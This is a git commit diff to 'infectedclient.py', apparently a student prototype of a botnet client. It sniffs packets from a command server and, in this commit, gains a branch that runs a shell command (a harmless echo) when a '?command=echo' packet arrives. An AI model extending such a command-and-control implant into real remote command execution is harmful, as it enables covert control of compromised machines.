f6badaef0f133b4b8a738083d53e74bab40a8927
Kelvin <kelvin.tsai@stonybrook.edu>
2019-05-02 01:06:34 -0400

    subprocess calling

--- client/infectedclient.py
+++ client/infectedclient.py
@@ -2,7 +2,7 @@ from scapy.all import *
 import random
 import sys
 import socket
-
+import subprocess
 
 
 #command server ip
@@ -11,8 +11,10 @@ serverPort = 8000
 
 def respondToServer(pkt):
 	if pkt.haslayer(Raw):
+		print(str(pkt.load))
 		#respond if a packet from the server includes this string set up a socket
-		if "?command" in str(pkt.load):
+		if "?command=stat" in str(pkt.load):
+			#print(str(pkt.load))
 			request = ('GET /test HTTP/1.1\nHost: ' + serverIP + '\n\n').encode()
 			print("command received")
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -21,5 +23,9 @@ def respondToServer(pkt):
 			result = s.recv(256)
 			if (len(result) > 0):
 				print(result)
+		elif "?command=echo" in str(pkt.load):
+			subprocess.call(["echo", "testtesttest"], shell=True)
+			
+
 
 sniff(filter="host " + serverIP, prn=respondToServer)
